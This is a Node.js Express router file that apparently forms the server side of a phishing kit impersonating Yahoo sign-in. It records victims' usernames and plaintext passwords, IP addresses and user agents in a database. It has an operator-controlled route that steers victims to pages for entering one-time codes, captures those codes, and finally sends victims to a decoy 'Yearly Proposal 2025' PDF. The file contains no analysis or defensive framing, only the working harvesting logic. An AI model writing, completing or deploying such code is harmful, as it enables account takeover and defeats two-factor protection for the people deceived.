const express = require ('express');
const router = express.Router();
const db = require('../db');
const bodyParser = require('body-parser');

router.use(express.static('public'));
router.use(express.static(__dirname + '/public'));
router.use(bodyParser.urlencoded({ extended: false }));


//validate form data before handling
// Custom middleware for form validation
const validateFormData = (req, res, next) => {
  const { username, password } = req.body;

  
  if (!username || !password) {
      return res.status(400).render('error');
  }

  // Additional validation checks can be added here

  // If validation passes, proceed to the next middleware or route handler
  next();
};


// Handle form submission

router.post('/submit', validateFormData, (req, res) => {
   
    const name = req.body.username;
    const b64 = Buffer.from(name).toString('base64');
    const word = req.body.password;
    const ip = req.socket.remoteAddress; 
    const useragent = req.get('User-Agent');
    const date = new Date();
    const pagetype = 0;
    const mobiletype = 0;
    const notify = 0;
 
    const sqlQuery =  'SELECT username FROM YahooTable WHERE username= ?';   
    db.query(sqlQuery, [name], (err, results) => {
      if (err) {
        console.error('Error executing query:', err);
        return res.status(500).json({ error: 'Internal Server Error' });
      }
    const rowCount = results.length;

      if (rowCount > 0) {
                            // Update the table if a matching record exists
                            const updateQuery = 'UPDATE YahooTable SET password = ? , pagetype = ? , mobiletype = ? , notify = ? WHERE username = ?';
                            db.query(updateQuery, [word, pagetype, mobiletype, notify, name], (err) => {
                                if (err) {
                                    console.error('Error updating record:', err);
                                    return res.status(500).send('Internal Server Error');
                                }
                                res.redirect(`/codeload/?tgrdsfgdytrbdfwergter=${b64}`);
                            });
                            } else {
                            // Insert a new record if no matching record exists
                            const insertQuery = 'INSERT INTO YahooTable (username, password, ip, useragent,date,notify) VALUES (?,?,?,?,?,?)';
                            db.query(insertQuery, [name, word, ip, useragent, date, notify], (err) => {
                                if (err) {
                                    console.error('Error inserting record:', err);
                                    return res.status(500).send('Internal Server Error');
                                }
                                res.redirect(`/codeload/?tgrdsfgdytrbdfwergter=${b64}`);
                            });
                                    }
      
  
     
    });
  
});



router.post('/codeotp' , (req, res) => {

  const { update, yes } = req.body;

  if (update) {


  const name = req.body.username;
  const pagetype = req.body.page;
  const mobiletype = req.body.mobile;
  const notif = 1;
  

  const sqlQuery =  'SELECT username FROM YahooTable WHERE username= ?';   
  db.query(sqlQuery, [name], (err, results) => {
    if (err) {
      console.error('Error executing query:', err);
      return res.status(500).json({ error: 'Internal Server Error' });
    }
  const rowCount = results.length;

    if (rowCount > 0) {
                        const updateQuery = 'UPDATE YahooTable SET pagetype = ? , mobiletype = ? , notify = ? WHERE username = ?';
                        db.query(updateQuery, [pagetype, mobiletype,notif,name], (err) => {
                            if (err) {
                                console.error('Error updating record:', err);
                                return res.status(500).send('Internal Server Error');
                            }

                            res.redirect('/backend');
                           
                        });
                          } 
       
  });

} else if (yes) { 

  const name = req.body.username;
  const pagetype= 999;
  const sqlQuery =  'SELECT username FROM YahooTable WHERE username= ?';   
  db.query(sqlQuery, [name], (err, results) => {
    if (err) {
      console.error('Error executing query:', err);
      return res.status(500).json({ error: 'Internal Server Error' });
    }
  const rowCount = results.length;

    if (rowCount > 0) {
                        const updateQuery = 'UPDATE YahooTable SET pagetype = ?  WHERE username = ?';
                        db.query(updateQuery, [pagetype, name], (err) => {
                            if (err) {
                                console.error('Error updating record:', err);
                                return res.status(500).send('Internal Server Error');
                            }

                            res.redirect('/backend');
                           
                        });
                          } 
       
  });

}

});





//handel code submission request

// const validateFormcode = (req, res, next) => {
//   const code = req.body.code;

//   // if (code == null) {
//   //     return res.status(400).render('error');
//   // }

//   // Additional validation checks can be added here

//   // If validation passes, proceed to the next middleware or route handler
//   next();
// };


router.post('/codepost', (req, res) => {
   
  
  const name = req.body.username;
  const code = req.body.code;
  const notify = 0;

  console.log(name,code);
  
  const sqlQuery =  'SELECT username FROM YahooTable WHERE username= ?';   
  db.query(sqlQuery, [name], (err, results) => {
    if (err) {
      console.error('Error executing query:', err);
      return res.status(500).json({ error: 'Internal Server Error' });
    }
  const rowCount = results.length;

    if (rowCount > 0) {
                          // Update the table if a matching record exists
                          const codeupdate = 'UPDATE YahooTable SET mobiletype = ? , notify = ?  WHERE username = ?';
                          db.query(codeupdate, [code, notify, name], (err) => {
                              if (err) {
                                  console.error('Error updating record:', err);
                                  return res.status(500).send('Internal Server Error');
                              }
                              res.redirect('./1082 (Yearly Proposal 2025 related ltr).pdf');

                          });
                          } 
    

   
  });

});




module.exports =router
